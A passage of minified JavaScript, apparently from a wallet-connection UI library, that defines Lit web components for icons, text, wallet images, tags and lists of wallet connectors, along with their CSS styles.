SQ})).recycleHorizontalSvg,refresh:async()=>(await Promise.resolve().then(function(){return PQ})).refreshSvg,search:async()=>(await Promise.resolve().then(function(){return OQ})).searchSvg,send:async()=>(await Promise.resolve().then(function(){return TQ})).sendSvg,swapHorizontal:async()=>(await Promise.resolve().then(function(){return RQ})).swapHorizontalSvg,swapHorizontalMedium:async()=>(await Promise.resolve().then(function(){return BQ})).swapHorizontalMediumSvg,swapHorizontalBold:async()=>(await Promise.resolve().then(function(){return UQ})).swapHorizontalBoldSvg,swapHorizontalRoundedBold:async()=>(await Promise.resolve().then(function(){return FQ})).swapHorizontalRoundedBoldSvg,swapVertical:async()=>(await Promise.resolve().then(function(){return jQ})).swapVerticalSvg,telegram:async()=>(await Promise.resolve().then(function(){return qQ})).telegramSvg,threeDots:async()=>(await Promise.resolve().then(function(){return WQ})).threeDotsSvg,twitch:async()=>(await Promise.resolve().then(function(){return KQ})).twitchSvg,twitter:async()=>(await Promise.resolve().then(function(){return R8})).xSvg,twitterIcon:async()=>(await Promise.resolve().then(function(){return QQ})).twitterIconSvg,verify:async()=>(await Promise.resolve().then(function(){return XQ})).verifySvg,verifyFilled:async()=>(await Promise.resolve().then(function(){return tY})).verifyFilledSvg,wallet:async()=>(await Promise.resolve().then(function(){return nY})).walletSvg,walletConnect:async()=>(await Promise.resolve().then(function(){return bm})).walletConnectSvg,walletConnectLightBrown:async()=>(await Promise.resolve().then(function(){return bm})).walletConnectLightBrownSvg,walletConnectBrown:async()=>(await Promise.resolve().then(function(){return bm})).walletConnectBrownSvg,walletPlaceholder:async()=>(await Promise.resolve().then(function(){return cY})).walletPlaceholderSvg,warningCircle:async()=>(await Promise.resolve().then(function(){return uY})).warningCircleSvg,x:async()=>(await Promise.resolve().then(function(){return R8})).xSvg,info:async()=>(await Promise.resolve().then(function(){return dY})).infoSvg,exclamationTriangle:async()=>(await Promise.resolve().then(function(){return pY})).exclamationTriangleSvg,reown:async()=>(await Promise.resolve().then(function(){return wY})).reownSvg};async function _G(t){if(Gw.has(t))return Gw.get(t);const e=(a8[t]??a8.copy)();return Gw.set(t,e),e}let na=class extends fe{constructor(){super(...arguments),this.size="md",this.name="copy",this.color="fg-300",this.aspectRatio="1 / 1"}render(){return this.style.cssText=`
      --local-color: ${`var(--wui-color-${this.color});`}
      --local-width: ${`var(--wui-icon-size-${this.size});`}
      --local-aspect-ratio: ${this.aspectRatio}
    `,U`${PG(_G(this.name),U`<div class="fallback"></div>`)}`}};na.styles=[Qe,ip,OG],Bh([F()],na.prototype,"size",void 0),Bh([F()],na.prototype,"name",void 0),Bh([F()],na.prototype,"color",void 0),Bh([F()],na.prototype,"aspectRatio",void 0),na=Bh([he("wui-icon")],na);/**
* @license
* Copyright 2018 Google LLC
* SPDX-License-Identifier: BSD-3-Clause
*/const D9=C2(class extends T9{constructor(t){var e;if(super(t),t.type!==_9.ATTRIBUTE||t.name!=="class"||((e=t.strings)==null?void 0:e.length)>2)throw Error("`classMap()` can only be used in the `class` attribute and must be the only part in the attribute.")}render(t){return" "+Object.keys(t).filter(e=>t[e]).join(" ")+" "}update(t,[e]){var n,i;if(this.st===void 0){this.st=new Set,t.strings!==void 0&&(this.nt=new Set(t.strings.join(" ").split(/\s/).filter(s=>s!=="")));for(const s in e)e[s]&&!((n=this.nt)!=null&&n.has(s))&&this.st.add(s);return this.render(e)}const r=t.element.classList;for(const s of this.st)s in e||(r.remove(s),this.st.delete(s));for(const s in e){const o=!!e[s];o===this.st.has(s)||(i=this.nt)!=null&&i.has(s)||(o?(r.add(s),this.st.add(s)):(r.remove(s),this.st.delete(s)))}return Hs}});var TG=Ae`
  :host {
    display: inline-flex !important;
  }

  slot {
    width: 100%;
    display: inline-block;
    font-style: normal;
    font-family: var(--wui-font-family);
    font-feature-settings:
      'tnum' on,
      'lnum' on,
      'case' on;
    line-height: 130%;
    font-weight: var(--wui-font-weight-regular);
    overflow: inherit;
    text-overflow: inherit;
    text-align: var(--local-align);
    color: var(--local-color);
  }

  .wui-line-clamp-1 {
    overflow: hidden;
    display: -webkit-box;
    -webkit-box-orient: vertical;
    -webkit-line-clamp: 1;
  }

  .wui-line-clamp-2 {
    overflow: hidden;
    display: -webkit-box;
    -webkit-box-orient: vertical;
    -webkit-line-clamp: 2;
  }

  .wui-font-medium-400 {
    font-size: var(--wui-font-size-medium);
    font-weight: var(--wui-font-weight-light);
    letter-spacing: var(--wui-letter-spacing-medium);
  }

  .wui-font-medium-600 {
    font-size: var(--wui-font-size-medium);
    letter-spacing: var(--wui-letter-spacing-medium);
  }

  .wui-font-title-600 {
    font-size: var(--wui-font-size-title);
    letter-spacing: var(--wui-letter-spacing-title);
  }

  .wui-font-title-6-600 {
    font-size: var(--wui-font-size-title-6);
    letter-spacing: var(--wui-letter-spacing-title-6);
  }

  .wui-font-mini-700 {
    font-size: var(--wui-font-size-mini);
    letter-spacing: var(--wui-letter-spacing-mini);
    text-transform: uppercase;
  }

  .wui-font-large-500,
  .wui-font-large-600,
  .wui-font-large-700 {
    font-size: var(--wui-font-size-large);
    letter-spacing: var(--wui-letter-spacing-large);
  }

  .wui-font-2xl-500,
  .wui-font-2xl-600,
  .wui-font-2xl-700 {
    font-size: var(--wui-font-size-2xl);
    letter-spacing: var(--wui-letter-spacing-2xl);
  }

  .wui-font-paragraph-400,
  .wui-font-paragraph-500,
  .wui-font-paragraph-600,
  .wui-font-paragraph-700 {
    font-size: var(--wui-font-size-paragraph);
    letter-spacing: var(--wui-letter-spacing-paragraph);
  }

  .wui-font-small-400,
  .wui-font-small-500,
  .wui-font-small-600 {
    font-size: var(--wui-font-size-small);
    letter-spacing: var(--wui-letter-spacing-small);
  }

  .wui-font-tiny-400,
  .wui-font-tiny-500,
  .wui-font-tiny-600 {
    font-size: var(--wui-font-size-tiny);
    letter-spacing: var(--wui-letter-spacing-tiny);
  }

  .wui-font-micro-700,
  .wui-font-micro-600 {
    font-size: var(--wui-font-size-micro);
    letter-spacing: var(--wui-letter-spacing-micro);
    text-transform: uppercase;
  }

  .wui-font-tiny-400,
  .wui-font-small-400,
  .wui-font-medium-400,
  .wui-font-paragraph-400 {
    font-weight: var(--wui-font-weight-light);
  }

  .wui-font-large-700,
  .wui-font-paragraph-700,
  .wui-font-micro-700,
  .wui-font-mini-700 {
    font-weight: var(--wui-font-weight-bold);
  }

  .wui-font-medium-600,
  .wui-font-medium-title-600,
  .wui-font-title-6-600,
  .wui-font-large-600,
  .wui-font-paragraph-600,
  .wui-font-small-600,
  .wui-font-tiny-600,
  .wui-font-micro-600 {
    font-weight: var(--wui-font-weight-medium);
  }

  :host([disabled]) {
    opacity: 0.4;
  }
`,Lh=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let ia=class extends fe{constructor(){super(...arguments),this.variant="paragraph-500",this.color="fg-300",this.align="left",this.lineClamp=void 0}render(){const t={[`wui-font-${this.variant}`]:!0,[`wui-color-${this.color}`]:!0,[`wui-line-clamp-${this.lineClamp}`]:!!this.lineClamp};return this.style.cssText=`
      --local-align: ${this.align};
      --local-color: var(--wui-color-${this.color});
    `,U`<slot class=${D9(t)}></slot>`}};ia.styles=[Qe,TG],Lh([F()],ia.prototype,"variant",void 0),Lh([F()],ia.prototype,"color",void 0),Lh([F()],ia.prototype,"align",void 0),Lh([F()],ia.prototype,"lineClamp",void 0),ia=Lh([he("wui-text")],ia);var $G=Ae`
  :host {
    display: inline-flex;
    justify-content: center;
    align-items: center;
    position: relative;
    overflow: hidden;
    background-color: var(--wui-color-gray-glass-020);
    border-radius: var(--local-border-radius);
    border: var(--local-border);
    box-sizing: content-box;
    width: var(--local-size);
    height: var(--local-size);
    min-height: var(--local-size);
    min-width: var(--local-size);
  }

  @supports (background: color-mix(in srgb, white 50%, black)) {
    :host {
      background-color: color-mix(in srgb, var(--local-bg-value) var(--local-bg-mix), transparent);
    }
  }
`,os=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let Zn=class extends fe{constructor(){super(...arguments),this.size="md",this.backgroundColor="accent-100",this.iconColor="accent-100",this.background="transparent",this.border=!1,this.borderColor="wui-color-bg-125",this.icon="copy"}render(){const t=this.iconSize||this.size,e=this.size==="lg",r=this.size==="xl",n=e?"12%":"16%",i=e?"xxs":r?"s":"3xl",s=this.background==="gray",o=this.background==="opaque",a=this.backgroundColor==="accent-100"&&o||this.backgroundColor==="success-100"&&o||this.backgroundColor==="error-100"&&o||this.backgroundColor==="inverse-100"&&o;let c=`var(--wui-color-${this.backgroundColor})`;return a?c=`var(--wui-icon-box-bg-${this.backgroundColor})`:s&&(c=`var(--wui-color-gray-${this.backgroundColor})`),this.style.cssText=`
       --local-bg-value: ${c};
       --local-bg-mix: ${a||s?"100%":n};
       --local-border-radius: var(--wui-border-radius-${i});
       --local-size: var(--wui-icon-box-size-${this.size});
       --local-border: ${this.borderColor==="wui-color-bg-125"?"2px":"1px"} solid ${this.border?`var(--${this.borderColor})`:"transparent"}
   `,U` <wui-icon color=${this.iconColor} size=${t} name=${this.icon}></wui-icon> `}};Zn.styles=[Qe,hr,$G],os([F()],Zn.prototype,"size",void 0),os([F()],Zn.prototype,"backgroundColor",void 0),os([F()],Zn.prototype,"iconColor",void 0),os([F()],Zn.prototype,"iconSize",void 0),os([F()],Zn.prototype,"background",void 0),os([F({type:Boolean})],Zn.prototype,"border",void 0),os([F()],Zn.prototype,"borderColor",void 0),os([F()],Zn.prototype,"icon",void 0),Zn=os([he("wui-icon-box")],Zn);var RG=Ae`
  :host {
    display: block;
    width: var(--local-width);
    height: var(--local-height);
  }

  img {
    display: block;
    width: 100%;
    height: 100%;
    object-fit: cover;
    object-position: center center;
    border-radius: inherit;
  }
`,qp=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let hl=class extends fe{constructor(){super(...arguments),this.src="./path/to/image.jpg",this.alt="Image",this.size=void 0}render(){return this.style.cssText=`
      --local-width: ${this.size?`var(--wui-icon-size-${this.size});`:"100%"};
      --local-height: ${this.size?`var(--wui-icon-size-${this.size});`:"100%"};
      `,U`<img src=${this.src} alt=${this.alt} @error=${this.handleImageError} />`}handleImageError(){this.dispatchEvent(new CustomEvent("onLoadError",{bubbles:!0,composed:!0}))}};hl.styles=[Qe,ip,RG],qp([F()],hl.prototype,"src",void 0),qp([F()],hl.prototype,"alt",void 0),qp([F()],hl.prototype,"size",void 0),hl=qp([he("wui-image")],hl);var DG=Ae`
  :host {
    position: relative;
    background-color: var(--wui-color-gray-glass-002);
    display: flex;
    justify-content: center;
    align-items: center;
    width: var(--local-size);
    height: var(--local-size);
    border-radius: inherit;
    border-radius: var(--local-border-radius);
  }

  :host > wui-flex {
    overflow: hidden;
    border-radius: inherit;
    border-radius: var(--local-border-radius);
  }

  :host::after {
    content: '';
    position: absolute;
    top: 0;
    bottom: 0;
    left: 0;
    right: 0;
    border-radius: inherit;
    border: 1px solid var(--wui-color-gray-glass-010);
    pointer-events: none;
  }

  :host([name='Extension'])::after {
    border: 1px solid var(--wui-color-accent-glass-010);
  }

  :host([data-wallet-icon='allWallets']) {
    background-color: var(--wui-all-wallets-bg-100);
  }

  :host([data-wallet-icon='allWallets'])::after {
    border: 1px solid var(--wui-color-accent-glass-010);
  }

  wui-icon[data-parent-size='inherit'] {
    width: 75%;
    height: 75%;
    align-items: center;
  }

  wui-icon[data-parent-size='sm'] {
    width: 18px;
    height: 18px;
  }

  wui-icon[data-parent-size='md'] {
    width: 24px;
    height: 24px;
  }

  wui-icon[data-parent-size='lg'] {
    width: 42px;
    height: 42px;
  }

  wui-icon[data-parent-size='full'] {
    width: 100%;
    height: 100%;
  }

  :host > wui-icon-box {
    position: absolute;
    overflow: hidden;
    right: -1px;
    bottom: -2px;
    z-index: 1;
    border: 2px solid var(--wui-color-bg-150, #1e1f1f);
    padding: 1px;
  }
`,sa=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let as=class extends fe{constructor(){super(...arguments),this.size="md",this.name="",this.installed=!1,this.badgeSize="xs"}render(){let t="xxs";return this.size==="lg"?t="m":this.size==="md"?t="xs":t="xxs",this.style.cssText=`
       --local-border-radius: var(--wui-border-radius-${t});
       --local-size: var(--wui-wallet-image-size-${this.size});
   `,this.walletIcon&&(this.dataset.walletIcon=this.walletIcon),U`
      <wui-flex justifyContent="center" alignItems="center"> ${this.templateVisual()} </wui-flex>
    `}templateVisual(){return this.imageSrc?U`<wui-image src=${this.imageSrc} alt=${this.name}></wui-image>`:this.walletIcon?U`<wui-icon
        data-parent-size="md"
        size="md"
        color="inherit"
        name=${this.walletIcon}
      ></wui-icon>`:U`<wui-icon
      data-parent-size=${this.size}
      size="inherit"
      color="inherit"
      name="walletPlaceholder"
    ></wui-icon>`}};as.styles=[hr,Qe,DG],sa([F()],as.prototype,"size",void 0),sa([F()],as.prototype,"name",void 0),sa([F()],as.prototype,"imageSrc",void 0),sa([F()],as.prototype,"walletIcon",void 0),sa([F({type:Boolean})],as.prototype,"installed",void 0),sa([F()],as.prototype,"badgeSize",void 0),as=sa([he("wui-wallet-image")],as);var BG=Ae`
  :host {
    position: relative;
    border-radius: var(--wui-border-radius-xxs);
    width: 40px;
    height: 40px;
    overflow: hidden;
    background: var(--wui-color-gray-glass-002);
    display: flex;
    justify-content: center;
    align-items: center;
    flex-wrap: wrap;
    gap: var(--wui-spacing-4xs);
    padding: 3.75px !important;
  }

  :host::after {
    content: '';
    position: absolute;
    top: 0;
    bottom: 0;
    left: 0;
    right: 0;
    border-radius: inherit;
    border: 1px solid var(--wui-color-gray-glass-010);
    pointer-events: none;
  }

  :host > wui-wallet-image {
    width: 14px;
    height: 14px;
    border-radius: var(--wui-border-radius-5xs);
  }

  :host > wui-flex {
    padding: 2px;
    position: fixed;
    overflow: hidden;
    left: 34px;
    bottom: 8px;
    background: var(--dark-background-150, #1e1f1f);
    border-radius: 50%;
    z-index: 2;
    display: flex;
  }
`,c8=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};const Kw=4;let Vp=class extends fe{constructor(){super(...arguments),this.walletImages=[]}render(){const t=this.walletImages.length<Kw;return U`${this.walletImages.slice(0,Kw).map(({src:e,walletName:r})=>U`
            <wui-wallet-image
              size="inherit"
              imageSrc=${e}
              name=${Ee(r)}
            ></wui-wallet-image>
          `)}
      ${t?[...Array(Kw-this.walletImages.length)].map(()=>U` <wui-wallet-image size="inherit" name=""></wui-wallet-image>`):null}
      <wui-flex>
        <wui-icon-box
          size="xxs"
          iconSize="xxs"
          iconcolor="success-100"
          backgroundcolor="success-100"
          icon="checkmark"
          background="opaque"
        ></wui-icon-box>
      </wui-flex>`}};Vp.styles=[Qe,BG],c8([F({type:Array})],Vp.prototype,"walletImages",void 0),Vp=c8([he("wui-all-wallets-image")],Vp);var LG=Ae`
  :host {
    display: flex;
    justify-content: center;
    align-items: center;
    height: var(--wui-spacing-m);
    padding: 0 var(--wui-spacing-3xs) !important;
    border-radius: var(--wui-border-radius-5xs);
    transition:
      border-radius var(--wui-duration-lg) var(--wui-ease-out-power-1),
      background-color var(--wui-duration-lg) var(--wui-ease-out-power-1);
    will-change: border-radius, background-color;
  }

  :host > wui-text {
    transform: translateY(5%);
  }

  :host([data-variant='main']) {
    background-color: var(--wui-color-accent-glass-015);
    color: var(--wui-color-accent-100);
  }

  :host([data-variant='shade']) {
    background-color: var(--wui-color-gray-glass-010);
    color: var(--wui-color-fg-200);
  }

  :host([data-variant='success']) {
    background-color: var(--wui-icon-box-bg-success-100);
    color: var(--wui-color-success-100);
  }

  :host([data-variant='error']) {
    background-color: var(--wui-icon-box-bg-error-100);
    color: var(--wui-color-error-100);
  }

  :host([data-size='lg']) {
    padding: 11px 5px !important;
  }

  :host([data-size='lg']) > wui-text {
    transform: translateY(2%);
  }
`,Zw=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let Uh=class extends fe{constructor(){super(...arguments),this.variant="main",this.size="lg"}render(){this.dataset.variant=this.variant,this.dataset.size=this.size;const t=this.size==="md"?"mini-700":"micro-700";return U`
      <wui-text data-variant=${this.variant} variant=${t} color="inherit">
        <slot></slot>
      </wui-text>
    `}};Uh.styles=[Qe,LG],Zw([F()],Uh.prototype,"variant",void 0),Zw([F()],Uh.prototype,"size",void 0),Uh=Zw([he("wui-tag")],Uh);var UG=Ae`
  button {
    column-gap: var(--wui-spacing-s);
    padding: 7px var(--wui-spacing-l) 7px var(--wui-spacing-xs);
    width: 100%;
    background-color: var(--wui-color-gray-glass-002);
    border-radius: var(--wui-border-radius-xs);
    color: var(--wui-color-fg-100);
  }

  button > wui-text:nth-child(2) {
    display: flex;
    flex: 1;
  }

  button:disabled {
    background-color: var(--wui-color-gray-glass-015);
    color: var(--wui-color-gray-glass-015);
  }

  button:disabled > wui-tag {
    background-color: var(--wui-color-gray-glass-010);
    color: var(--wui-color-fg-300);
  }

  wui-icon {
    color: var(--wui-color-fg-200) !important;
  }
`,Lr=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let fr=class extends fe{constructor(){super(...arguments),this.walletImages=[],this.imageSrc="",this.name="",this.tabIdx=void 0,this.installed=!1,this.disabled=!1,this.showAllWallets=!1,this.loading=!1,this.loadingSpinnerColor="accent-100"}render(){return U`
      <button ?disabled=${this.disabled} tabindex=${Ee(this.tabIdx)}>
        ${this.templateAllWallets()} ${this.templateWalletImage()}
        <wui-text variant="paragraph-500" color="inherit">${this.name}</wui-text>
        ${this.templateStatus()}
      </button>
    `}templateAllWallets(){return this.showAllWallets&&this.imageSrc?U` <wui-all-wallets-image .imageeSrc=${this.imageSrc}> </wui-all-wallets-image> `:this.showAllWallets&&this.walletIcon?U` <wui-wallet-image .walletIcon=${this.walletIcon} size="sm"> </wui-wallet-image> `:null}templateWalletImage(){return!this.showAllWallets&&this.imageSrc?U`<wui-wallet-image
        size="sm"
        imageSrc=${this.imageSrc}
        name=${this.name}
        .installed=${this.installed}
      ></wui-wallet-image>`:!this.showAllWallets&&!this.imageSrc?U`<wui-wallet-image size="sm" name=${this.name}></wui-wallet-image>`:null}templateStatus(){return this.loading?U`<wui-loading-spinner
        size="lg"
        color=${this.loadingSpinnerColor}
      ></wui-loading-spinner>`:this.tagLabel&&this.tagVariant?U`<wui-tag variant=${this.tagVariant}>${this.tagLabel}</wui-tag>`:this.icon?U`<wui-icon color="inherit" size="sm" name=${this.icon}></wui-icon>`:null}};fr.styles=[Qe,hr,UG],Lr([F({type:Array})],fr.prototype,"walletImages",void 0),Lr([F()],fr.prototype,"imageSrc",void 0),Lr([F()],fr.prototype,"name",void 0),Lr([F()],fr.prototype,"tagLabel",void 0),Lr([F()],fr.prototype,"tagVariant",void 0),Lr([F()],fr.prototype,"icon",void 0),Lr([F()],fr.prototype,"walletIcon",void 0),Lr([F()],fr.prototype,"tabIdx",void 0),Lr([F({type:Boolean})],fr.prototype,"installed",void 0),Lr([F({type:Boolean})],fr.prototype,"disabled",void 0),Lr([F({type:Boolean})],fr.prototype,"showAllWallets",void 0),Lr([F({type:Boolean})],fr.prototype,"loading",void 0),Lr([F({type:String})],fr.prototype,"loadingSpinnerColor",void 0),fr=Lr([he("wui-list-wallet")],fr);var Mh=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let dl=class extends fe{constructor(){super(),this.unsubscribe=[],this.tabIdx=void 0,this.connectors=ae.state.connectors,this.count=oe.state.count,this.isFetchingRecommendedWallets=oe.state.isFetchingRecommendedWallets,this.unsubscribe.push(ae.subscribeKey("connectors",t=>this.connectors=t),oe.subscribeKey("count",t=>this.count=t),oe.subscribeKey("isFetchingRecommendedWallets",t=>this.isFetchingRecommendedWallets=t))}disconnectedCallback(){this.unsubscribe.forEach(t=>t())}render(){const t=this.connectors.find(o=>o.id==="walletConnect"),{allWallets:e}=Y.state;if(!t||e==="HIDE"||e==="ONLY_MOBILE"&&!te.isMobile())return null;const r=oe.state.featured.length,n=this.count+r,i=n<10?n:Math.floor(n/10)*10,s=i<n?`${i}+`:`${i}`;return U`
      <wui-list-wallet
        name="All Wallets"
        walletIcon="allWallets"
        showAllWallets
        @click=${this.onAllWallets.bind(this)}
        tagLabel=${s}
        tagVariant="shade"
        data-testid="all-wallets"
        tabIdx=${Ee(this.tabIdx)}
        .loading=${this.isFetchingRecommendedWallets}
        loadingSpinnerColor=${this.isFetchingRecommendedWallets?"fg-300":"accent-100"}
      ></wui-list-wallet>
    `}onAllWallets(){De.sendEvent({type:"track",event:"CLICK_ALL_WALLETS"}),se.push("AllWallets")}};Mh([F()],dl.prototype,"tabIdx",void 0),Mh([le()],dl.prototype,"connectors",void 0),Mh([le()],dl.prototype,"count",void 0),Mh([le()],dl.prototype,"isFetchingRecommendedWallets",void 0),dl=Mh([he("w3m-all-wallets-widget")],dl);var Jw=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let Wp=class extends fe{constructor(){super(),this.unsubscribe=[],this.tabIdx=void 0,this.connectors=ae.state.connectors,this.unsubscribe.push(ae.subscribeKey("connectors",t=>this.connectors=t))}disconnectedCallback(){this.unsubscribe.forEach(t=>t())}render(){const t=this.connectors.filter(e=>e.type==="ANNOUNCED");return t!=null&&t.length?U`
      <wui-flex flexDirection="column" gap="xs">
        ${t.filter(Ms.showConnector).map(e=>U`
              <wui-list-wallet
                imageSrc=${Ee(Mt.getConnectorImage(e))}
                name=${e.name??"Unknown"}
                @click=${()=>this.onConnector(e)}
                tagVariant="success"
                tagLabel="installed"
                data-testid=${`wallet-selector-${e.id}`}
                .installed=${!0}
                tabIdx=${Ee(this.tabIdx)}
              >
              </wui-list-wallet>
            `)}
      </wui-flex>
    `:(this.style.cssText="display: none",null)}onConnector(t){t.id==="walletConnect"?te.isMobile()?se.push("AllWallets"):se.push("ConnectingWalletConnect"):se.push("ConnectingExternal",{connector:t})}};Jw([F()],Wp.prototype,"tabIdx",void 0),Jw([le()],Wp.prototype,"connectors",void 0),Wp=Jw([he("w3m-connect-announced-widget")],Wp);var Gp=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let Fh=class extends fe{constructor(){super(),this.unsubscribe=[],this.tabIdx=void 0,this.connectors=ae.state.connectors,this.loading=!1,this.unsubscribe.push(ae.subscribeKey("connectors",t=>this.connectors=t)),te.isTelegram()&&te.isIos()&&(this.loading=!we.state.wcUri,this.unsubscribe.push(we.subscribeKey("wcUri",t=>this.loading=!t)))}disconnectedCallback(){this.unsubscribe.forEach(t=>t())}render(){const{customWallets:t}=Y.state;if(!(t!=null&&t.length))return this.style.cssText="display: none",null;const e=this.filterOutDuplicateWallets(t);return U`<wui-flex flexDirection="column" gap="xs">
      ${e.map(r=>U`
          <wui-list-wallet
            imageSrc=${Ee(Mt.getWalletImage(r))}
            name=${r.name??"Unknown"}
            @click=${()=>this.onConnectWallet(r)}
            data-testid=${`wallet-selector-${r.id}`}
            tabIdx=${Ee(this.tabIdx)}
            ?loading=${this.loading}
          >
          </wui-list-wallet>
        `)}
    </wui-flex>`}filterOutDuplicateWallets(t){const e=pe.getRecentWallets(),r=this.connectors.map(s=>{var o;return(o=s.info)==null?void 0:o.rdns}).filter(Boolean),n=e.map(s=>s.rdns).filter(Boolean),i=r.concat(n);if(i.includes("io.metamask.mobile")&&te.isMobile()){const s=i.indexOf("io.metamask.mobile");i[s]="io.metamask"}return t.filter(s=>!i.includes(String(s==null?void 0:s.rdns)))}onConnectWallet(t){this.loading||se.push("ConnectingWalletConnect",{wallet:t})}};Gp([F()],Fh.prototype,"tabIdx",void 0),Gp([le()],Fh.prototype,"connectors",void 0),Gp([le()],Fh.prototype,"loading",void 0),Fh=Gp([he("w3m-connect-custom-widget")],Fh);var Qw=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let Kp=class extends fe{constructor(){super(),this.unsubscribe=[],this.tabIdx=void 0,this.connectors=ae.state.connectors,this.unsubscribe.push(ae.subscribeKey("connectors",t=>this.connectors=t))}disconnectedCallback(){this.unsubscribe.forEach(t=>t())}render(){const t=this.connectors.filter(e=>e.type==="EXTERNAL").filter(Ms.showConnector).filter(e=>e.id!==ve.CONNECTOR_ID.COINBASE_SDK);return t!=null&&t.length?U`
      <wui-flex flexDirection="column" gap="xs">
        ${t.map(e=>U`
            <wui-list-wallet
              imageSrc=${Ee(Mt.getConnectorImage(e))}
              .installed=${!0}
              name=${e.name??"Unknown"}
              data-testid=${`wallet-selector-external-${e.id}`}
              @click=${()=>this.onConnector(e)}
              tabIdx=${Ee(this.tabIdx)}
            >
            </wui-list-wallet>
          `)}
      </wui-flex>
    `:(this.style.cssText="display: none",null)}onConnector(t){se.push("ConnectingExternal",{connector:t})}};Qw([F()],Kp.prototype,"tabIdx",void 0),Qw([le()],Kp.prototype,"connectors",void 0),Kp=Qw([he("w3m-connect-external-widget")],Kp);var Yw=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let Zp=class extends fe{constructor(){super(...arguments),this.tabIdx=void 0,this.wallets=[]}render(){return this.wallets.length?U`
      <wui-flex flexDirection="column" gap="xs">
        ${this.wallets.map(t=>U`
            <wui-list-wallet
              data-testid=${`wallet-selector-featured-${t.id}`}
              imageSrc=${Ee(Mt.getWalletImage(t))}
              name=${t.name??"Unknown"}
              @click=${()=>this.onConnectWallet(t)}
              tabIdx=${Ee(this.tabIdx)}
            >
            </wui-list-wallet>
          `)}
      </wui-flex>
    `:(this.style.cssText="display: none",null)}onConnectWallet(t){ae.selectWalletConnector(t)}};Yw([F()],Zp.prototype,"tabIdx",void 0),Yw([F()],Zp.prototype,"wallets",void 0),Zp=Yw([he("w3m-connect-featured-widget")],Zp);var Xw=function(t,e,r,n){var i=arguments.length,s=i<3?e:n,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,r,n);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,r,s):o(e,r))||s);return i>3&&s&&Object.defineProperty(e,r,s),s};let Jp=class extends fe{constructor(){super(...arguments),this.tabIdx=void 0,this.connectors=[]}render(){var e;const t=this.connectors;return!(t!=null&&t.length)||t.length===1&&((e=t[0])==null?void 0:e.name)==="Browser Wallet"&&!te.isMobile()?(this.style.cssText="display: none",null):U`
      <wui-flex flexDirection="column" gap="xs">
        ${t.map(r=>{var i;const n=(i=r.info)==null?void 0:i.rdns;return!te.isMobile()&&r.name==="Browser Wallet"?null:!n&&!we.checkInstalled()?(this.style.cssText="display: none",null):Ms.showConnector(r)?U`
            <wui-list-wallet
